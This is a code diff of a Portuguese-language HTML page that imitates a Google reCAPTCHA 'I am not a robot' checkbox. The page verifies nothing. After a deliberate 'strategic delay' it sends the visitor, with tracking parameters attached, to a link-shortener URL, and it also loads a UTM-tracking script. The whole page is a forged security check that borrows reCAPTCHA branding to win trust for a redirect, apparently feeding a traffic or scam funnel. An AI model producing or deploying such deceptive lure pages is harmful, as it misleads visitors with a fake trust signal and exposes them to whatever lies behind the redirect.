@@ -2,103 +2,134 @@
 <html lang="pt-BR">
 <head>
 
-  <script
-    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-    data-utmify-prevent-xcod-sck
-    data-utmify-prevent-subids
-    async
-    defer
-  ></script>
-  
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Verificação</title>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
 
- <script>
-  function verificar() {
-    const check = document.getElementById("naoSouRobo");
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Verificação de Segurança</title>
 
-    if (check.checked) {
+<script>
+function verificar() {
+  const check = document.getElementById("naoSouRobo");
+  const loading = document.getElementById("loading");
+
+  if (check.checked) {
+    loading.style.display = "block";
+
+    setTimeout(() => {
       const params = window.location.search;
       const baseUrl = "https://encurtar-link.click/l/bot-d6112058";
       const redirectUrl = baseUrl + params;
 
       window.location.href = redirectUrl;
-    }
+    }, 1800); // delay estratégico
   }
+}
 </script>
 
-  <style>
-    body {
-      background: #f9f9f9;
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
+<style>
+body {
+  background: #f1f1f1;
+  font-family: Arial, sans-serif;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  margin: 0;
+}
 
-    .captcha-box {
-      background: white;
-      border: 1px solid #d3d3d3;
-      border-radius: 6px;
-      width: 320px;
-      padding: 15px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-    }
+.top-text {
+  font-size: 14px;
+  color: #555;
+  margin-bottom: 15px;
+  text-align: center;
+  max-width: 300px;
+}
 
-    .captcha-content {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
+.captcha-box {
+  background: white;
+  border: 1px solid #d3d3d3;
+  border-radius: 8px;
+  width: 340px;
+  padding: 18px;
+  box-shadow: 0 3px 10px rgba(0,0,0,0.08);
+}
 
-    .left {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
+.captcha-content {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
 
-    input[type="checkbox"] {
-      width: 24px;
-      height: 24px;
-      cursor: pointer;
-    }
+.left {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
 
-    .text {
-      font-size: 16px;
-      color: #333;
-    }
+input[type="checkbox"] {
+  width: 26px;
+  height: 26px;
+  cursor: pointer;
+}
 
-    .right {
-      text-align: center;
-      font-size: 10px;
-      color: #777;
-    }
+.text {
+  font-size: 17px;
+  color: #222;
+}
 
-    .logo {
-      font-weight: bold;
-      font-size: 12px;
-    }
-  </style>
+.right {
+  text-align: center;
+  font-size: 10px;
+  color: #888;
+}
+
+.logo {
+  font-weight: bold;
+  font-size: 12px;
+}
+
+#loading {
+  display: none;
+  margin-top: 15px;
+  font-size: 13px;
+  color: #555;
+  text-align: center;
+}
+</style>
+
 </head>
 
 <body>
 
-  <div class="captcha-box">
-    <div class="captcha-content">
-      <div class="left">
-        <input type="checkbox" id="naoSouRobo" onclick="verificar()">
-        <div class="text">Não sou um robô</div>
-      </div>
+<div class="top-text">
+🔒 Verificação de segurança necessária para continuar
+</div>
 
-      <div class="right">
-        <div class="logo">reCAPTCHA</div>
-        <div>Privacidade - Termos</div>
-      </div>
+<div class="captcha-box">
+  <div class="captcha-content">
+    <div class="left">
+      <input type="checkbox" id="naoSouRobo" onclick="verificar()">
+      <div class="text">Não sou um robô</div>
+    </div>
+
+    <div class="right">
+      <div class="logo">reCAPTCHA</div>
+      <div>Privacidade - Termos</div>
     </div>
   </div>
+
+  <div id="loading">
+    Verificando...
+  </div>
+</div>
 
 </body>
 </html>
